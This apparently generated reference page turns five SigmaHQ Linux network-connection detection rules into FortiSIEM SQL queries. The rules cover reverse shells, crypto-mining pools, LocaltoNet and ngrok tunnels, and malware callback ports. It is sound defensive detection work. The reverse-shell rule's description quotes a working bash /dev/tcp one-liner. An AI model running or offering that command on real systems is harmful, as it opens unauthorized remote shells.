# Sigma → FortiSIEM: Linux Network Connection

> 5 rules · Generated 2026-03-17

## Table of Contents

- [Linux Reverse Shell Indicator](#linux-reverse-shell-indicator)
- [Linux Crypto Mining Pool Connections](#linux-crypto-mining-pool-connections)
- [Communication To LocaltoNet Tunneling Service Initiated - Linux](#communication-to-localtonet-tunneling-service-initiated-linux)
- [Communication To Ngrok Tunneling Service - Linux](#communication-to-ngrok-tunneling-service-linux)
- [Potentially Suspicious Malware Callback Communication - Linux](#potentially-suspicious-malware-callback-communication-linux)

## Linux Reverse Shell Indicator

| Field | Value |
|---|---|
| **Sigma ID** | `83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871` |
| **Level** | critical |
| **FSM Severity** | 9 |
| **MITRE Tactics** | execution |
| **MITRE Techniques** | T1059.004 |
| **Author** | Florian Roth (Nextron Systems) |
| **Status** | test |

**[View on GitHub ↗](https://github.com/SigmaHQ/sigma/blob/main/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml)**

> Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

```sql
-- ============================================================
-- Title:        Linux Reverse Shell Indicator
-- Sigma ID:     83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
-- Level:        critical  |  FSM Severity: 9
-- Status:       test
-- MITRE:        execution | T1059.004
-- Author:       Florian Roth (Nextron Systems)
-- Date:         2021-10-16
-- GitHub:       https://github.com/SigmaHQ/sigma/blob/main/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml
-- Unmapped:     (none)
-- False Pos:    Unknown
-- ============================================================

SELECT
  phRecvTime,
  reptDevName,
  reptDevIpAddrV4,
  user,
  procName,
  destIpAddrV4,
  rawEventMsg
FROM fsiem.events
WHERE eventType IN ('LINUX_NET_CONN')
  AND phRecvTime >= now() - INTERVAL 24 HOUR
  AND (procName LIKE '%/bin/bash'
  AND NOT (destIpAddrV4 IN ('127.0.0.1', '0.0.0.0')))
ORDER BY phRecvTime DESC
LIMIT 1000;
```

**False Positives:** Unknown

**References:**
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

---

## Linux Crypto Mining Pool Connections

| Field | Value |
|---|---|
| **Sigma ID** | `a46c93b7-55ed-4d27-a41b-c259456c4746` |
| **Level** | high |
| **FSM Severity** | 7 |
| **MITRE Tactics** | impact |
| **MITRE Techniques** | T1496 |
| **Author** | Florian Roth (Nextron Systems) |
| **Status** | stable |

**[View on GitHub ↗](https://github.com/SigmaHQ/sigma/blob/main/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml)**

> Detects process connections to a Monero crypto mining pool

```sql
-- ============================================================
-- Title:        Linux Crypto Mining Pool Connections
-- Sigma ID:     a46c93b7-55ed-4d27-a41b-c259456c4746
-- Level:        high  |  FSM Severity: 7
-- Status:       stable
-- MITRE:        impact | T1496
-- Author:       Florian Roth (Nextron Systems)
-- Date:         2021-10-26
-- GitHub:       https://github.com/SigmaHQ/sigma/blob/main/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml
-- Unmapped:     (none)
-- False Pos:    Legitimate use of crypto miners
-- ============================================================

SELECT
  phRecvTime,
  reptDevName,
  reptDevIpAddrV4,
  user,
  metrics_string.value[indexOf(metrics_string.name,'destHostName')] AS destinationHostname,
  rawEventMsg
FROM fsiem.events
WHERE eventType IN ('LINUX_NET_CONN')
  AND phRecvTime >= now() - INTERVAL 24 HOUR
  AND indexOf(metrics_string.name, 'destHostName') > 0
    AND (metrics_string.value[indexOf(metrics_string.name,'destHostName')] IN ('pool.minexmr.com', 'fr.minexmr.com', 'de.minexmr.com', 'sg.minexmr.com', 'ca.minexmr.com', 'us-west.minexmr.com', 'pool.supportxmr.com', 'mine.c3pool.com', 'xmr-eu1.nanopool.org', 'xmr-eu2.nanopool.org', 'xmr-us-east1.nanopool.org', 'xmr-us-west1.nanopool.org', 'xmr-asia1.nanopool.org', 'xmr-jp1.nanopool.org', 'xmr-au1.nanopool.org', 'xmr.2miners.com', 'xmr.hashcity.org', 'xmr.f2pool.com', 'xmrpool.eu', 'pool.hashvault.pro', 'moneroocean.stream', 'monerocean.stream'))
ORDER BY phRecvTime DESC
LIMIT 1000;
```

**False Positives:** Legitimate use of crypto miners

**References:**
- https://www.poolwatch.io/coin/monero

---

## Communication To LocaltoNet Tunneling Service Initiated - Linux

| Field | Value |
|---|---|
| **Sigma ID** | `c4568f5d-131f-4e78-83d4-45b2da0ec4f1` |
| **Level** | high |
| **FSM Severity** | 7 |
| **MITRE Techniques** | T1572, T1090, T1102 |
| **Author** | Andreas Braathen (mnemonic.io) |
| **Status** | test |

**[View on GitHub ↗](https://github.com/SigmaHQ/sigma/blob/main/rules/linux/network_connection/net_connection_lnx_domain_localtonet_tunnel.yml)**

> Detects an executable initiating a network connection to "LocaltoNet" tunneling sub-domains.
LocaltoNet is a reverse proxy that enables localhost services to be exposed to the Internet.
Attackers have been seen to use this service for command-and-control activities to bypass MFA and perimeter controls.


```sql
-- ============================================================
-- Title:        Communication To LocaltoNet Tunneling Service Initiated - Linux
-- Sigma ID:     c4568f5d-131f-4e78-83d4-45b2da0ec4f1
-- Level:        high  |  FSM Severity: 7
-- Status:       test
-- MITRE:        T1572, T1090, T1102
-- Author:       Andreas Braathen (mnemonic.io)
-- Date:         2024-06-17
-- GitHub:       https://github.com/SigmaHQ/sigma/blob/main/rules/linux/network_connection/net_connection_lnx_domain_localtonet_tunnel.yml
-- Unmapped:     (none)
-- False Pos:    Legitimate use of the LocaltoNet service.
-- ============================================================

SELECT
  phRecvTime,
  reptDevName,
  reptDevIpAddrV4,
  user,
  metrics_string.value[indexOf(metrics_string.name,'destHostName')] AS destinationHostname,
  metrics_string.value[indexOf(metrics_string.name,'initiated')] AS initiated,
  rawEventMsg
FROM fsiem.events
WHERE eventType IN ('LINUX_NET_CONN')
  AND phRecvTime >= now() - INTERVAL 24 HOUR
  AND ((indexOf(metrics_string.name, 'destHostName') > 0
    AND (metrics_string.value[indexOf(metrics_string.name,'destHostName')] LIKE '%.localto.net' OR metrics_string.value[indexOf(metrics_string.name,'destHostName')] LIKE '%.localtonet.com'))
    AND indexOf(metrics_string.name, 'initiated') > 0
    AND (metrics_string.value[indexOf(metrics_string.name,'initiated')] = 'true'))
ORDER BY phRecvTime DESC
LIMIT 1000;
```

**False Positives:** Legitimate use of the LocaltoNet service.

**References:**
- https://localtonet.com/documents/supported-tunnels
- https://cloud.google.com/blog/topics/threat-intelligence/unc3944-targets-saas-applications

---

## Communication To Ngrok Tunneling Service - Linux

| Field | Value |
|---|---|
| **Sigma ID** | `19bf6fdb-7721-4f3d-867f-53467f6a5db6` |
| **Level** | high |
| **FSM Severity** | 7 |
| **MITRE Tactics** | exfiltration |
| **MITRE Techniques** | T1567, T1568.002, T1572, T1090, T1102 |
| **Author** | Florian Roth (Nextron Systems) |
| **Status** | test |

**[View on GitHub ↗](https://github.com/SigmaHQ/sigma/blob/main/rules/linux/network_connection/net_connection_lnx_ngrok_tunnel.yml)**

> Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors

```sql
-- ============================================================
-- Title:        Communication To Ngrok Tunneling Service - Linux
-- Sigma ID:     19bf6fdb-7721-4f3d-867f-53467f6a5db6
-- Level:        high  |  FSM Severity: 7
-- Status:       test
-- MITRE:        exfiltration | T1567, T1568.002, T1572, T1090, T1102
-- Author:       Florian Roth (Nextron Systems)
-- Date:         2022-11-03
-- GitHub:       https://github.com/SigmaHQ/sigma/blob/main/rules/linux/network_connection/net_connection_lnx_ngrok_tunnel.yml
-- Unmapped:     (none)
-- False Pos:    Legitimate use of ngrok
-- ============================================================

SELECT
  phRecvTime,
  reptDevName,
  reptDevIpAddrV4,
  user,
  metrics_string.value[indexOf(metrics_string.name,'destHostName')] AS destinationHostname,
  rawEventMsg
FROM fsiem.events
WHERE eventType IN ('LINUX_NET_CONN')
  AND phRecvTime >= now() - INTERVAL 24 HOUR
  AND (indexOf(metrics_string.name, 'destHostName') > 0
    AND (metrics_string.value[indexOf(metrics_string.name,'destHostName')] LIKE '%tunnel.us.ngrok.com%' OR metrics_string.value[indexOf(metrics_string.name,'destHostName')] LIKE '%tunnel.eu.ngrok.com%' OR metrics_string.value[indexOf(metrics_string.name,'destHostName')] LIKE '%tunnel.ap.ngrok.com%' OR metrics_string.value[indexOf(metrics_string.name,'destHostName')] LIKE '%tunnel.au.ngrok.com%' OR metrics_string.value[indexOf(metrics_string.name,'destHostName')] LIKE '%tunnel.sa.ngrok.com%' OR metrics_string.value[indexOf(metrics_string.name,'destHostName')] LIKE '%tunnel.jp.ngrok.com%' OR metrics_string.value[indexOf(metrics_string.name,'destHostName')] LIKE '%tunnel.in.ngrok.com%'))
ORDER BY phRecvTime DESC
LIMIT 1000;
```

**False Positives:** Legitimate use of ngrok

**References:**
- https://twitter.com/hakluke/status/1587733971814977537/photo/1
- https://ngrok.com/docs/secure-tunnels/tunnels/ssh-reverse-tunnel-agent

---

## Potentially Suspicious Malware Callback Communication - Linux

| Field | Value |
|---|---|
| **Sigma ID** | `dbfc7c98-04ab-4ab7-aa94-c74d22aa7376` |
| **Level** | high |
| **FSM Severity** | 7 |
| **MITRE Tactics** | persistence |
| **MITRE Techniques** | T1571 |
| **Author** | hasselj |
| **Status** | test |

**[View on GitHub ↗](https://github.com/SigmaHQ/sigma/blob/main/rules/linux/network_connection/net_connection_lnx_susp_malware_callback_port.yml)**

> Detects programs that connect to known malware callback ports based on threat intelligence reports.


```sql
-- ============================================================
-- Title:        Potentially Suspicious Malware Callback Communication - Linux
-- Sigma ID:     dbfc7c98-04ab-4ab7-aa94-c74d22aa7376
-- Level:        high  |  FSM Severity: 7
-- Status:       test
-- MITRE:        persistence | T1571
-- Author:       hasselj
-- Date:         2024-05-10
-- GitHub:       https://github.com/SigmaHQ/sigma/blob/main/rules/linux/network_connection/net_connection_lnx_susp_malware_callback_port.yml
-- Unmapped:     (none)
-- False Pos:    Unknown
-- ============================================================

SELECT
  phRecvTime,
  reptDevName,
  reptDevIpAddrV4,
  user,
  destIpPort,
  metrics_string.value[indexOf(metrics_string.name,'initiated')] AS initiated,
  rawEventMsg
FROM fsiem.events
WHERE eventType IN ('LINUX_NET_CONN')
  AND phRecvTime >= now() - INTERVAL 24 HOUR
  AND (indexOf(metrics_string.name, 'initiated') > 0
    AND (metrics_string.value[indexOf(metrics_string.name,'initiated')] = 'true')
    AND destIpPort IN ('888', '999', '2200', '2222', '4000', '4444', '6789', '8531', '50501', '51820'))
ORDER BY phRecvTime DESC
LIMIT 1000;
```

**False Positives:** Unknown

**References:**
- https://www.mandiant.com/resources/blog/triton-actor-ttp-profile-custom-attack-tools-detections
- https://www.mandiant.com/resources/blog/ukraine-and-sandworm-team
- https://www.elastic.co/guide/en/security/current/potential-non-standard-port-ssh-connection.html
- https://thehackernews.com/2024/01/systembc-malwares-c2-server-analysis.html
- https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors

---
